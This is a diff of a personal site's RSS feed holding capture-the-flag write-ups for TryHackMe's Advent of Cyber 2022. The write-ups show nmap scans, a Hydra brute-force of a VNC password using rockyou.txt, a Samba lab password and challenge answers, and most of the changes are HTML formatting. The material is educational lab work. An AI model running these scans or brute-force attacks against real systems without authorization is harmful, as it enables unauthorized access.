             <description>Day 4 of tryhackme&amp;rsquo;s Advent of Cyber for 2022! This challenge involves learning about various scanning techniques, particularly with network scanning tools.
-Learning Objectives  What is Scanning? Scanning types Scanning techniques Scanning tools  What is the name of the HTTP server running on the remote host? To figure out the name of the HTTP server running on the remote host, we will use the nmap tool. The command that we are interested in is nmap -sV MACHINE_IP which will return a list of running services on a live host.</description>
+Learning Objectives What is Scanning? Scanning types Scanning techniques Scanning tools What is the name of the HTTP server running on the remote host? To figure out the name of the HTTP server running on the remote host, we will use the nmap tool. The command that we are interested in is nmap -sV MACHINE_IP which will return a list of running services on a live host.</description>
             <content type="html"><![CDATA[<p>Day 4 of <a href="https://tryhackme.com">tryhackme</a>&rsquo;s <a href="https://tryhackme.com/christmas">Advent of Cyber for 2022</a>! This challenge involves learning about various scanning techniques, particularly with network scanning tools.</p>
 <h3 id="learning-objectives">Learning Objectives</h3>
 <ul>
@@ -560,24 +696,24 @@ Learning Objectives  What is Scanning? Scanning types Scanning techniques Scanni
 </ul>
 <h4 id="what-is-the-name-of-the-http-server-running-on-the-remote-host">What is the name of the HTTP server running on the remote host?</h4>
 <p>To figure out the name of the HTTP server running on the remote host, we will use the nmap tool. The command that we are interested in is <code>nmap -sV MACHINE_IP</code> which will return a list of running services on a live host. See output below:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">user@hostName:~$ nmap -sV MACHINE_IP
-Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-04 20:12 EST
-Nmap scan report <span style="color:#66d9ef">for</span> MACHINE_IP
-Host is up <span style="color:#f92672">(</span>0.099s latency<span style="color:#f92672">)</span>.
-Not shown: <span style="color:#ae81ff">996</span> closed ports
-PORT    STATE SERVICE     VERSION
-22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
-80/tcp  open  http        Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
-139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
-445/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
-Service Info: Host: IP-MACHINE_IP; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre></div><p><strong>Answer:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@hostName:~$ nmap -sV MACHINE_IP
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-04 20:12 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> MACHINE_IP
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.099s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> closed ports
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http        Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: IP-MACHINE_IP; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p><strong>Answer:</strong></p>
 <pre tabindex="0"><code>Apache
 </code></pre><h4 id="what-is-the-name-of-the-service-running-on-port-22-on-the-qa-server">What is the name of the service running on port 22 on the QA server?</h4>
 <p>To determine the name of the service that we are interested in we can observe the output from the above question and we notice that the service running on port 22 is <code>ssh</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT    STATE SERVICE     VERSION
-22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
-</code></pre></div><p><strong>Answer:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT    STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p><strong>Answer:</strong></p>
 <pre tabindex="0"><code>ssh
 </code></pre><h4 id="what-flag-can-you-find-after-successfully-accessing-the-samba-service">What flag can you find after successfully accessing the Samba service?</h4>
 <p>To retrieve the flag can be accomplshed in a variety of different ways. I attempted to access the Samba share through the terminal however I could not gain access to the folder of interest. Therefore I went through THM&rsquo;s AttackBox to accomplish the next 2 tasks.</p>
@@ -615,7 +751,7 @@ password: S@nta2022
             
             <guid>https://shanks.dev/posts/ctf-writeups/cyber-advent-2022/day-05/readme/</guid>
             <description>Day 5 of tryhackme&amp;rsquo;s Advent of Cyber for 2022! This challenge involves learning about brute-force attacks that an attacker can use in an attempt to penetrate a system/service/application.
-Learning Objectives  Learn about common remote access services. Recognize a listening VNC port in a port scan. Use a tool to find the VNC server’s password. Connect to the VNC server using a VNC client.  Use Hydra to find the VNC password of the target with IP address MACHINE_IP.</description>
+Learning Objectives Learn about common remote access services. Recognize a listening VNC port in a port scan. Use a tool to find the VNC server’s password. Connect to the VNC server using a VNC client. Use Hydra to find the VNC password of the target with IP address MACHINE_IP.</description>
             <content type="html"><![CDATA[<p>Day 5 of <a href="https://tryhackme.com">tryhackme</a>&rsquo;s <a href="https://tryhackme.com/christmas">Advent of Cyber for 2022</a>! This challenge involves learning about brute-force attacks that an attacker can use in an attempt to penetrate a system/service/application.</p>
 <h4 id="learning-objectives">Learning Objectives</h4>
 <ul>
@@ -626,19 +762,19 @@ Learning Objectives  Learn about common remote access services. Recognize a list
 </ul>
 <h4 id="use-hydra-to-find-the-vnc-password-of-the-target-with-ip-address-machine_ip-what-is-the-password">Use Hydra to find the VNC password of the target with IP address <code>MACHINE_IP</code>. What is the password?</h4>
 <p>Before we begin using Hydra, we can use <code>nmap</code> to see that there is a vnc service running on our target machine:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">user@hostName:~$ sudo nmap -sS MACHINE_IP
-Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-05 20:45 EST
-Nmap scan report <span style="color:#66d9ef">for</span> MACHINE_IP
-Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
-Not shown: <span style="color:#ae81ff">998</span> closed ports
-PORT     STATE SERVICE
-22/tcp   open  ssh
-5900/tcp open  vnc
-
-Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 3.00 seconds
-</code></pre></div><p>Now onward to using hydra. For this we don&rsquo;t pass any username (<code>-l</code> option) but we will be using the popular <code>rockyou.txt</code> file which contains the worlds most common passwords. We will accomplish the task using the following command:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">user@hostName:~$ hydra -P /path/to/rockyou.txt MACHINE_IP vnc
-</code></pre></div><p>Below is the output from using the above command in the AttackBox:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@hostName:~$ sudo nmap -sS MACHINE_IP
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-05 20:45 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> MACHINE_IP
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed ports
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>5900/tcp open  vnc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 3.00 seconds
+</span></span></code></pre></div><p>Now onward to using hydra. For this we don&rsquo;t pass any username (<code>-l</code> option) but we will be using the popular <code>rockyou.txt</code> file which contains the worlds most common passwords. We will accomplish the task using the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@hostName:~$ hydra -P /path/to/rockyou.txt MACHINE_IP vnc
+</span></span></code></pre></div><p>Below is the output from using the above command in the AttackBox:</p>
 <p><img src="../imgs/hydra-pw.png" alt="hydra"></p>
 <p>We notice that after some time, hydra does in fact find the password to the vnc server via brute-force.</p>
 <p><strong>Answer:</strong></p>
@@ -678,7 +814,7 @@ Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</spa
             
             <guid>https://shanks.dev/posts/ctf-writeups/cyber-advent-2022/day-06/readme/</guid>
             <description>Day 6 of tryhackme&amp;rsquo;s Advent of Cyber for 2022! This challenge involves learning about phishing emails. This challenge provides in-depth information surrounding emails and how it works.
-Learning Objectives  Learn what email analysis is and why it still matters. Learn the email header sections. Learn the essential questions to ask in email analysis. Learn how to use email header sections to evaluate an email. Learn to use additional tools to discover email attachments and conduct further analysis.</description>
+Learning Objectives Learn what email analysis is and why it still matters. Learn the email header sections. Learn the essential questions to ask in email analysis. Learn how to use email header sections to evaluate an email. Learn to use additional tools to discover email attachments and conduct further analysis.</description>
             <content type="html"><![CDATA[<p>Day 6 of <a href="https://tryhackme.com">tryhackme</a>&rsquo;s <a href="https://tryhackme.com/christmas">Advent of Cyber for 2022</a>! This challenge involves learning about phishing emails. This challenge provides in-depth information surrounding emails and how it works.</p>
 <h4 id="learning-objectives">Learning Objectives</h4>
 <ul>
@@ -691,8 +827,8 @@ Learning Objectives  Learn what email analysis is and why it still matters. Lear
 </ul>
 <h4 id="what-is-the-email-address-of-the-sender">What is the email address of the sender?</h4>
 <p>Following the guide that TryHackMe showed us, we use the given command <strong>after</strong> we <code>cd</code> into the <code>Desktop</code> directory:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ emlAnalyzer -i Urgent<span style="color:#ae81ff">\:</span>.eml --header --html -u --text --extract-all
-</code></pre></div><p>Looking at the output of the <code>emlAnalyzer</code> command under the <code>Header</code> section we see:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ emlAnalyzer -i Urgent<span style="color:#ae81ff">\:</span>.eml --header --html -u --text --extract-all
+</span></span></code></pre></div><p>Looking at the output of the <code>emlAnalyzer</code> command under the <code>Header</code> section we see:</p>
 <p><img src="../imgs/sender.png" alt="sender"></p>
 <p><strong>Answer:</strong></p>
 <pre tabindex="0"><code>chief.elf@santaclaus.thm
@@ -758,7 +894,7 @@ Learning Objectives  Learn what email analysis is and why it still matters. Lear
             
             <guid>https://shanks.dev/posts/ctf-writeups/cyber-advent-2022/day-07/readme/</guid>
             <description>Day 7 of tryhackme&amp;rsquo;s Advent of Cyber for 2022! This challenge involves learning about
-Learning Objectives  What is CyberChef What are the capabilities of CyberChef How to leverage CyberChef to analyze a malicious document How to deobfuscate, filter and parse the data  What is the version of CyberChef found in the attached VM? Reading the VMs file path in the browser we see the version displayed.
+Learning Objectives What is CyberChef What are the capabilities of CyberChef How to leverage CyberChef to analyze a malicious document How to deobfuscate, filter and parse the data What is the version of CyberChef found in the attached VM? Reading the VMs file path in the browser we see the version displayed.
 Answer:
 9.49.0 How many recipes were used to extract URLs from the malicious doc?</description>
             <content type="html"><![CDATA[<p>Day 7 of <a href="https://tryhackme.com">tryhackme</a>&rsquo;s <a href="https://tryhackme.com/christmas">Advent of Cyber for 2022</a>! This challenge involves learning about</p>
@@ -806,7 +942,7 @@ Answer:
             <guid>https://shanks.dev/posts/ctf-writeups/cyber-advent-2022/day-08/readme/</guid>
             <description>Day 8 of tryhackme&amp;rsquo;s Advent of Cyber for 2022! This challenge involves learning about smart contracts and their relation to the blockchain.
 Downloadable files These are the included files to complete the day-8 task.
-Learning Objectives  Explain what smart contracts are, how they relate to the blockchain, and why they are important. Understand how contracts are related, what they are built upon, and standard core functions. Understand and exploit a common smart contract vulnerability.</description>
+Learning Objectives Explain what smart contracts are, how they relate to the blockchain, and why they are important. Understand how contracts are related, what they are built upon, and standard core functions. Understand and exploit a common smart contract vulnerability.</description>
             <content type="html"><![CDATA[<p>Day 8 of <a href="https://tryhackme.com">tryhackme</a>&rsquo;s <a href="https://tryhackme.com/christmas">Advent of Cyber for 2022</a>! This challenge involves learning about smart contracts and their relation to the blockchain.</p>
 <h2 id="downloadable-files">Downloadable files</h2>
 <p>These are the <a href="https://github.com/HunterShanks/cyber-advent-2022/tree/master/day-08/AoCSmartContracts">included files</a> to complete the day-8 task.</p>
@@ -836,7 +972,7 @@ Learning Objectives  Explain what smart contracts are, how they relate to the bl
             
             <guid>https://shanks.dev/posts/ctf-writeups/cyber-advent-2022/readme/</guid>
             <description>Welcome to the annual event of tryhackme&amp;rsquo;s Advent of Cyber for 2022! This repo contains all of the solutions completed by myself for the purpose of self-learning and educating others that may stumble upon this repo. Each folder will contain the day&amp;rsquo;s task(s) and solutions as well as any software/programs/scripts that I may create. Enjoy!
-Authors  Shanks  Contributing Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.</description>
+Authors Shanks Contributing Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.</description>
             <content type="html"><![CDATA[<p><img src="../imgs/cyber-advent-2022-logo.png" alt="Cyber Advent 2022"></p>
 <p>Welcome to the annual event of <a href="https://tryhackme.com">tryhackme</a>&rsquo;s <a href="https://tryhackme.com/christmas">Advent of Cyber</a> for 2022! This repo contains all of the solutions completed by myself for the purpose of self-learning and educating others that may stumble upon this repo. Each folder will contain the day&rsquo;s task(s) and solutions as well as any software/programs/scripts that I may create. Enjoy!</p>
 <h2 id="authors">Authors</h2>
@@ -870,8 +1006,8 @@ Authors  Shanks  Contributing Pull requests are welcome. For major changes, plea
             
             <guid>https://shanks.dev/posts/ctf-writeups/cyber-advent-2022/day-09/readme/</guid>
             <description>Cyber Advent 2022 - Day 9 [Pivoting] [Dock the halls] Day 9 of tryhackme&amp;rsquo;s Advent of Cyber for 2022! This challenge involves learning about
-Learning Objectives     Answer:
- Authors  Shanks  </description>
+Learning Objectives Answer:
+Authors Shanks </description>
             <content type="html"><![CDATA[<h1 id="cyber-advent-2022---day-9-span-stylecolorredpivotingspan-dock-the-halls">Cyber Advent 2022 - Day 9 [<!-- raw HTML omitted -->Pivoting<!-- raw HTML omitted -->] [Dock the halls]</h1>
 <p>Day 9 of <a href="https://tryhackme.com">tryhackme</a>&rsquo;s <a href="https://tryhackme.com/christmas">Advent of Cyber for 2022</a>! This challenge involves learning about</p>
 <h4 id="learning-objectives">Learning Objectives</h4>
@@ -880,8 +1016,7 @@ Learning Objectives     Answer:
 </ul>
 <h4 id="heading"></h4>
 <p><strong>Answer:</strong></p>
-<pre tabindex="0"><code>
-</code></pre><h2 id="authors">Authors</h2>
+<pre tabindex="0"><code></code></pre><h2 id="authors">Authors</h2>
 <ul>
 <li><a href="https://github.com/HunterShanks">Shanks</a></li>
 </ul>
@@ -895,8 +1030,8 @@ Learning Objectives     Answer:
             
             <guid>https://shanks.dev/posts/ctf-writeups/cyber-advent-2022/day-10/readme/</guid>
             <description>Cyber Advent 2022 - Day 10 [Hack a game] [You&amp;rsquo;re a mean one, Mr. Yeti] Day 10 of tryhackme&amp;rsquo;s Advent of Cyber for 2022! This challenge involves learning about
-Learning Objectives     Answer:
- Authors  Shanks  </description>
+Learning Objectives Answer:
+Authors Shanks </description>
             <content type="html"><![CDATA[<h1 id="cyber-advent-2022---day-10-span-stylecolorredhack-a-gamespan-youre-a-mean-one-mr-yeti">Cyber Advent 2022 - Day 10 [<!-- raw HTML omitted -->Hack a game<!-- raw HTML omitted -->] [You&rsquo;re a mean one, Mr. Yeti]</h1>
 <p>Day 10 of <a href="https://tryhackme.com">tryhackme</a>&rsquo;s <a href="https://tryhackme.com/christmas">Advent of Cyber for 2022</a>! This challenge involves learning about</p>
 <h4 id="learning-objectives">Learning Objectives</h4>
@@ -905,8 +1040,7 @@ Learning Objectives     Answer:
 </ul>
 <h4 id="heading"></h4>
 <p><strong>Answer:</strong></p>
-<pre tabindex="0"><code>
-</code></pre><h2 id="authors">Authors</h2>
+<pre tabindex="0"><code></code></pre><h2 id="authors">Authors</h2>
 <ul>
 <li><a href="https://github.com/HunterShanks">Shanks</a></li>
 </ul>
@@ -920,8 +1054,8 @@ Learning Objectives     Answer:
             
             <guid>https://shanks.dev/posts/ctf-writeups/cyber-advent-2022/day-11/readme/</guid>
             <description>Cyber Advent 2022 - Day 11 [Memory Forensics] [Not all gifts are nice] Day 11 of tryhackme&amp;rsquo;s Advent of Cyber for 2022! This challenge involves learning about
-Learning Objectives     Answer:
- Authors  Shanks  </description>
+Learning Objectives Answer:
+Authors Shanks </description>
             <content type="html"><![CDATA[<h1 id="cyber-advent-2022---day-11-span-stylecolorbluememory-forensicsspan-not-all-gifts-are-nice">Cyber Advent 2022 - Day 11 [<!-- raw HTML omitted -->Memory Forensics<!-- raw HTML omitted -->] [Not all gifts are nice]</h1>
 <p>Day 11 of <a href="https://tryhackme.com">tryhackme</a>&rsquo;s <a href="https://tryhackme.com/christmas">Advent of Cyber for 2022</a>! This challenge involves learning about</p>
 <h4 id="learning-objectives">Learning Objectives</h4>
@@ -930,8 +1064,7 @@ Learning Objectives     Answer:
 </ul>
 <h4 id="heading"></h4>
 <p><strong>Answer:</strong></p>
-<pre tabindex="0"><code>
-</code></pre><h2 id="authors">Authors</h2>
+<pre tabindex="0"><code></code></pre><h2 id="authors">Authors</h2>
 <ul>
 <li><a href="https://github.com/HunterShanks">Shanks</a></li>
 </ul>
@@ -945,8 +1078,8 @@ Learning Objectives     Answer:
             
             <guid>https://shanks.dev/posts/ctf-writeups/cyber-advent-2022/day-12/readme/</guid>
             <description>Cyber Advent 2022 - Day 12 [Malware Analysis] [Forensic McBlue to the REVscue!] Day 12 of tryhackme&amp;rsquo;s Advent of Cyber for 2022! This challenge involves learning about
-Learning Objectives     Answer:
- Authors  Shanks  </description>
+Learning Objectives Answer:
+Authors Shanks </description>
             <content type="html"><![CDATA[<h1 id="cyber-advent-2022---day-12-span-stylecolorbluemalware-analysisspan-forensic-mcblue-to-the-revscue">Cyber Advent 2022 - Day 12 [<!-- raw HTML omitted -->Malware Analysis<!-- raw HTML omitted -->] [Forensic McBlue to the REVscue!]</h1>
 <p>Day 12 of <a href="https://tryhackme.com">tryhackme</a>&rsquo;s <a href="https://tryhackme.com/christmas">Advent of Cyber for 2022</a>! This challenge involves learning about</p>
 <h4 id="learning-objectives">Learning Objectives</h4>
@@ -955,8 +1088,7 @@ Learning Objectives     Answer:
 </ul>
 <h4 id="heading"></h4>
 <p><strong>Answer:</strong></p>
-<pre tabindex="0"><code>
-</code></pre><h2 id="authors">Authors</h2>
+<pre tabindex="0"><code></code></pre><h2 id="authors">Authors</h2>
 <ul>
 <li><a href="https://github.com/HunterShanks">Shanks</a></li>
 </ul>
@@ -987,8 +1119,8 @@ Permission is hereby granted, free of charge, to any person obtaining a copy of 
             
             <guid>https://shanks.dev/posts/ctf-writeups/cyber-advent-2022/template/</guid>
             <description>Cyber Advent 2022 - Day # [TOPIC] [Title] Day # of tryhackme&amp;rsquo;s Advent of Cyber for 2022! This challenge involves learning about
-Learning Objectives     Answer:
- Authors  Shanks  </description>
+Learning Objectives Answer:
+Authors Shanks </description>
             <content type="html"><![CDATA[<h1 id="cyber-advent-2022---day--span-stylecolorredtopicspan-title">Cyber Advent 2022 - Day # [<!-- raw HTML omitted -->TOPIC<!-- raw HTML omitted -->] [Title]</h1>
 <p>Day # of <a href="https://tryhackme.com">tryhackme</a>&rsquo;s <a href="https://tryhackme.com/christmas">Advent of Cyber for 2022</a>! This challenge involves learning about</p>
 <h4 id="learning-objectives">Learning Objectives</h4>
@@ -997,8 +1129,7 @@ Learning Objectives     Answer:
 </ul>
 <h4 id="heading"></h4>
 <p><strong>Answer:</strong></p>
-<pre tabindex="0"><code>
-</code></pre><h2 id="authors">Authors</h2>
+<pre tabindex="0"><code></code></pre><h2 id="authors">Authors</h2>
 <ul>
 <li><a href="https://github.com/HunterShanks">Shanks</a></li>
 </ul>
